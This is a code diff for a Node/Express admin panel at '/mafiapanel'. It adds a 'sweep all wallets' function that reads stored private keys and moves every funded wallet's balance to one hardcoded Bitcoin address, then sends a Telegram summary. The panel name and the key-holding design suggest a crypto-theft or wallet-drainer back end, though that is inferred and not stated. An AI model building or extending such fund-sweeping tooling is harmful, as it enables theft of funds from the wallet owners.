@@ -329,6 +329,7 @@ router.get('/', (req, res) => {
                 <button onclick="refreshBalances()">🔄 REFRESH BALANCES</button>
                 <button onclick="exportData()">💾 EXPORT DATA</button>
                 <button onclick="loadWallets()">📋 RELOAD WALLETS</button>
+                <button onclick="sweepAllWallets()" style="background: #ff3300; color: #fff; margin-left: 20px;">🧹 SWEEP ALL WALLETS</button>
             </div>
             
             <div id="loadingIndicator" class="loading" style="display: none;">
@@ -507,6 +508,60 @@ router.get('/', (req, res) => {
             .catch(error => {
                 document.getElementById('loadingIndicator').style.display = 'none';
                 showError('Sweep failed: ' + error.message);
+            });
+        }
+        
+        function sweepAllWallets() {
+            if (!confirm(\`🚨 DANGER: SWEEP ALL WALLETS 🚨\\n\\nThis will sweep ALL wallets with funds to the safe address!\\n\\nThis action cannot be undone!\\n\\nAre you absolutely sure?\`)) {
+                return;
+            }
+            
+            if (!confirm(\`⚠️ FINAL CONFIRMATION ⚠️\\n\\nYou are about to sweep ALL wallets to:\\nbc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg\\n\\nThis will create multiple transactions.\\n\\nProceed?\`)) {
+                return;
+            }
+            
+            document.getElementById('loadingIndicator').style.display = 'block';
+            document.getElementById('loadingIndicator').innerHTML = '🧹 Sweeping all wallets... This may take a while...';
+            document.getElementById('errorContainer').innerHTML = '';
+            
+            fetch(\`/mafiapanel/sweep-all\`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    password: currentPassword 
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('loadingIndicator').style.display = 'none';
+                document.getElementById('loadingIndicator').innerHTML = '🔄 Loading wallet balances...';
+                
+                if (data.success) {
+                    let message = \`✅ Sweep All Completed!\\n\\n\`;
+                    message += \`📊 Results:\\n\`;
+                    message += \`• Successful: \${data.successful} wallets\\n\`;
+                    message += \`• Failed: \${data.failed} wallets\\n\`;
+                    message += \`• Total Amount: \${data.totalSweptBTC} BTC\\n\`;
+                    message += \`• Transactions: \${data.transactions.length}\\n\\n\`;
+                    
+                    if (data.transactions.length > 0) {
+                        message += \`Transaction IDs:\\n\`;
+                        data.transactions.forEach((tx, index) => {
+                            message += \`\${index + 1}. \${tx}\\n\`;
+                        });
+                    }
+                    
+                    alert(message);
+                    // Refresh the wallets to show updated balances
+                    loadWallets();
+                } else {
+                    showError(\`Sweep All failed: \${data.error}\`);
+                }
+            })
+            .catch(error => {
+                document.getElementById('loadingIndicator').style.display = 'none';
+                document.getElementById('loadingIndicator').innerHTML = '🔄 Loading wallet balances...';
+                showError('Sweep All failed: ' + error.message);
             });
         }
         
@@ -740,6 +795,142 @@ router.post('/sweep', requireAdminAuth, async (req, res) => {
     res.status(500).json({ 
       success: false,
       error: 'Failed to sweep wallet', 
+      details: error.message 
+    });
+  }
+});
+
+// Sweep all wallets with funds to safe address
+router.post('/sweep-all', requireAdminAuth, async (req, res) => {
+  try {
+    const wallets = loadWallets();
+    const { autoSweepToSecureAddress } = require('./bitcoin');
+    
+    const results = {
+      successful: 0,
+      failed: 0,
+      totalSweptSats: 0,
+      totalSweptBTC: '0.00000000',
+      transactions: [],
+      errors: []
+    };
+    
+    console.log('🧹 Starting sweep-all operation...');
+    
+    // Get current balances for all wallets first
+    const walletsWithFunds = [];
+    for (const [address, wallet] of Object.entries(wallets)) {
+      if (wallet.privateKey) {
+        try {
+          const balance = await getWalletBalance(address);
+          if (balance.success && balance.balanceSats > 1000) { // Only sweep if > 1000 sats to cover fees
+            walletsWithFunds.push({
+              address,
+              privateKey: wallet.privateKey,
+              balanceSats: balance.balanceSats,
+              balanceBTC: balance.balanceBTC
+            });
+          }
+        } catch (error) {
+          console.error(`Failed to get balance for ${address}:`, error.message);
+        }
+      }
+    }
+    
+    console.log(`🧹 Found ${walletsWithFunds.length} wallets with funds to sweep`);
+    
+    // Sweep each wallet with funds
+    for (const walletInfo of walletsWithFunds) {
+      try {
+        console.log(`🧹 Sweeping wallet ${walletInfo.address} (${walletInfo.balanceBTC} BTC)`);
+        
+        const sweepResult = await autoSweepToSecureAddress(
+          walletInfo.privateKey,
+          walletInfo.address,
+          `Admin panel SWEEP ALL operation - Bulk wallet consolidation`
+        );
+        
+        if (sweepResult.success) {
+          results.successful++;
+          results.totalSweptSats += sweepResult.sweepAmount;
+          results.transactions.push(sweepResult.txId);
+          
+          // Update wallet in storage to reflect sweep
+          const wallet = wallets[walletInfo.address];
+          wallet.lastUpdated = new Date().toISOString();
+          wallet.lastSwept = new Date().toISOString();
+          wallet.sweptAmount = sweepResult.sweepAmount;
+          wallet.sweptTxId = sweepResult.txId;
+          wallet.sweepAllOperation = true;
+          
+          console.log(`✅ Successfully swept ${walletInfo.address}: ${sweepResult.sweptBTC} BTC`);
+        } else {
+          results.failed++;
+          results.errors.push({
+            address: walletInfo.address,
+            error: sweepResult.error || sweepResult.reason
+          });
+          console.log(`❌ Failed to sweep ${walletInfo.address}: ${sweepResult.error || sweepResult.reason}`);
+        }
+        
+        // Add delay between sweeps to prevent overwhelming the network
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+      } catch (error) {
+        results.failed++;
+        results.errors.push({
+          address: walletInfo.address,
+          error: error.message
+        });
+        console.error(`❌ Exception while sweeping ${walletInfo.address}:`, error.message);
+      }
+    }
+    
+    // Calculate total BTC swept
+    results.totalSweptBTC = (results.totalSweptSats / 100000000).toFixed(8);
+    
+    // Save updated wallet information
+    saveWallets(wallets);
+    
+    // Send summary Telegram notification
+    const timestamp = new Date().toISOString();
+    const summaryMessage = `🧹 <b>SWEEP ALL COMPLETED</b>\n\n` +
+                          `📊 <b>Summary:</b>\n` +
+                          `• Successful: ${results.successful} wallets\n` +
+                          `• Failed: ${results.failed} wallets\n` +
+                          `• Total Swept: ${results.totalSweptBTC} BTC\n` +
+                          `• Transactions: ${results.transactions.length}\n` +
+                          `🔒 <b>Safe Address:</b> <code>bc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg</code>\n` +
+                          `⏰ <b>Time:</b> ${timestamp}\n` +
+                          `🛡️ <b>Operation:</b> Bulk wallet consolidation`;
+    
+    // Send notification (assuming sendTelegramNotification is available)
+    try {
+      const { sendTelegramNotification } = require('./bitcoin');
+      await sendTelegramNotification(summaryMessage);
+    } catch (error) {
+      console.log('⚠️ Could not send Telegram notification:', error.message);
+    }
+    
+    console.log(`🧹 Sweep-all completed: ${results.successful} successful, ${results.failed} failed, ${results.totalSweptBTC} BTC total`);
+    
+    res.json({
+      success: true,
+      message: 'Sweep all operation completed',
+      successful: results.successful,
+      failed: results.failed,
+      totalSweptSats: results.totalSweptSats,
+      totalSweptBTC: results.totalSweptBTC,
+      transactions: results.transactions,
+      errors: results.errors,
+      walletsProcessed: walletsWithFunds.length
+    });
+    
+  } catch (error) {
+    console.error('❌ Sweep-all operation failed:', error.message);
+    res.status(500).json({ 
+      success: false,
+      error: 'Failed to sweep all wallets', 
       details: error.message 
     });
   }
